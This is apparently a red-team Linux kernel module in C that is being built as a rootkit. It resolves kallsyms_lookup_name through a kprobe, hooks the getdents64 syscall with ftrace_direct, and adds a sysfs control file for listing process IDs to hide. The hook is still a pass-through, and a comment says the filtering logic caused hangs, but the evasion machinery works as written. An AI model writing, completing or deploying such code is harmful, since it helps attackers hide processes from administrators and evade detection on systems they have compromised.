#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/spinlock.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>
#include <asm/syscall.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Red Team");
MODULE_DESCRIPTION("Kernel evasion ftrace_direct hooking module");

/* ============================================================
 * Hidden PID list — kernel-safe list with spinlock
 * ============================================================ */
struct hidden_pid {
	struct list_head list;
	pid_t pid;
};

static LIST_HEAD(hidden_pids);
static DEFINE_SPINLOCK(hidden_pids_lock);

static bool is_pid_hidden(pid_t pid)
{
	struct hidden_pid *entry;
	bool found = false;

	spin_lock(&hidden_pids_lock);
	list_for_each_entry(entry, &hidden_pids, list) {
		if (entry->pid == pid) {
			found = true;
			break;
		}
	}
	spin_unlock(&hidden_pids_lock);
	return found;
}

static int add_hidden_pid(pid_t pid)
{
	struct hidden_pid *entry;

	spin_lock(&hidden_pids_lock);
	list_for_each_entry(entry, &hidden_pids, list) {
		if (entry->pid == pid) {
			spin_unlock(&hidden_pids_lock);
			return -EEXIST;
		}
	}
	spin_unlock(&hidden_pids_lock);

	entry = kmalloc(sizeof(*entry), GFP_KERNEL);
	if (!entry)
		return -ENOMEM;
	entry->pid = pid;

	spin_lock(&hidden_pids_lock);
	list_add_tail(&entry->list, &hidden_pids);
	spin_unlock(&hidden_pids_lock);

	return 0;
}

static void clear_hidden_pids(void)
{
	struct hidden_pid *entry, *tmp;

	spin_lock(&hidden_pids_lock);
	list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
		list_del(&entry->list);
		kfree(entry);
	}
	spin_unlock(&hidden_pids_lock);
}

/* ============================================================
 * Sysfs interface for dynamic PID control
 * ============================================================ */
static struct kobject *evasion_kobj;

static ssize_t hide_pid_store(struct kobject *kobj,
			      struct kobj_attribute *attr,
			      const char *buf, size_t count)
{
	pid_t pid;
	int ret;

	ret = kstrtoint(buf, 10, &pid);
	if (ret)
		return ret;

	ret = add_hidden_pid(pid);
	if (ret == -EEXIST)
		return count;
	if (ret)
		return ret;

	pr_info("kernel_evasion: now hiding PID %d\n", pid);
	return count;
}

static ssize_t hide_pid_show(struct kobject *kobj,
			     struct kobj_attribute *attr, char *buf)
{
	struct hidden_pid *entry;
	int len = 0;

	spin_lock(&hidden_pids_lock);
	list_for_each_entry(entry, &hidden_pids, list) {
		len += scnprintf(buf + len, PAGE_SIZE - len, "%d\n", entry->pid);
		if (len >= PAGE_SIZE - 1)
			break;
	}
	spin_unlock(&hidden_pids_lock);
	return len;
}

static struct kobj_attribute hide_pid_attr =
	__ATTR(hide_pid, 0644, hide_pid_show, hide_pid_store);

/* ============================================================
 * ftrace_direct hooking — version-gated
 * ============================================================ */
static asmlinkage long (*original_getdents64)(const struct pt_regs *regs);

/* Forward declaration */
asmlinkage long hooked_getdents64(const struct pt_regs *regs);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
static struct ftrace_ops direct_ops = {
	.flags = FTRACE_OPS_FL_IPMODIFY | FTRACE_OPS_FL_RECURSION,
};
#endif

asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
	/* TEMPORARY: Simple pass-through to test module stability */
	/* The complex filtering logic is causing system hangs */
	/* TODO: Debug the filtering implementation separately */
	return original_getdents64(regs);
}

/* ============================================================
 * kallsyms_lookup_name resolution via kprobe
 * (The kprobe works — kprobe registration resolves symbols
 *  internally via kallsyms_lookup_name(), regardless of export.)
 * ============================================================ */
static unsigned long resolve_kallsyms_lookup_name(void)
{
	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
	unsigned long addr;

	if (register_kprobe(&kp) < 0) {
		pr_err("kernel_evasion: kprobe registration failed "
		       "(CONFIG_KPROBES / CONFIG_KALLSYMS missing?)\n");
		return 0;
	}

	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

/* ============================================================
 * Module init / exit
 * ============================================================ */
static int __init ke_init(void)
{
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t lookup;
	int ret;

	pr_info("kernel_evasion: loading\n");

	/* Step 1: Resolve kallsyms_lookup_name via kprobe */
	lookup = (kallsyms_lookup_name_t)resolve_kallsyms_lookup_name();
	if (!lookup) {
		pr_err("kernel_evasion: cannot resolve kallsyms_lookup_name\n");
		return -ENOENT;
	}

	/* Step 2: Find __x64_sys_getdents64 */
	original_getdents64 = (void *)lookup("__x64_sys_getdents64");
	if (!original_getdents64) {
		pr_err("kernel_evasion: cannot find __x64_sys_getdents64\n");
		return -ENOENT;
	}

	pr_info("kernel_evasion: __x64_sys_getdents64 at %px\n",
		original_getdents64);

	/* Step 3: Register ftrace_direct hook */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
	ret = ftrace_set_filter_ip(&direct_ops,
				   (unsigned long)original_getdents64, 0, 0);
	if (ret) {
		pr_err("kernel_evasion: ftrace_set_filter_ip failed: %d\n", ret);
		return ret;
	}

	ret = register_ftrace_direct(&direct_ops,
				     (unsigned long)hooked_getdents64);
	if (ret) {
		pr_err("kernel_evasion: register_ftrace_direct failed: %d\n", ret);
		ftrace_set_filter_ip(&direct_ops,
				     (unsigned long)original_getdents64, 1, 0);
		return ret;
	}
#else
	ret = register_ftrace_direct((unsigned long)original_getdents64,
				     (unsigned long)hooked_getdents64);
	if (ret) {
		pr_err("kernel_evasion: register_ftrace_direct failed: %d\n", ret);
		return ret;
	}
#endif

	/* Step 4: Create sysfs interface for dynamic PID control */
	evasion_kobj = kobject_create_and_add("kernel_evasion", kernel_kobj);
	if (!evasion_kobj) {
		pr_err("kernel_evasion: failed to create sysfs object\n");
	} else {
		ret = sysfs_create_file(evasion_kobj, &hide_pid_attr.attr);
		if (ret)
			pr_warn("kernel_evasion: sysfs_create_file failed: %d\n", ret);
	}

	pr_info("kernel_evasion: loaded — use "
		"echo <PID> > /sys/kernel/kernel_evasion/hide_pid\n");
	return 0;
}

static void __exit ke_exit(void)
{
	pr_info("kernel_evasion: unloading\n");

	if (evasion_kobj) {
		sysfs_remove_file(evasion_kobj, &hide_pid_attr.attr);
		kobject_put(evasion_kobj);
	}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
	unregister_ftrace_direct(&direct_ops,
				 (unsigned long)hooked_getdents64, true);
	ftrace_set_filter_ip(&direct_ops,
			     (unsigned long)original_getdents64, 1, 0);
#else
	unregister_ftrace_direct((unsigned long)original_getdents64,
				 (unsigned long)hooked_getdents64);
#endif

	clear_hidden_pids();
	pr_info("kernel_evasion: unloaded\n");
}

module_init(ke_init);
module_exit(ke_exit);
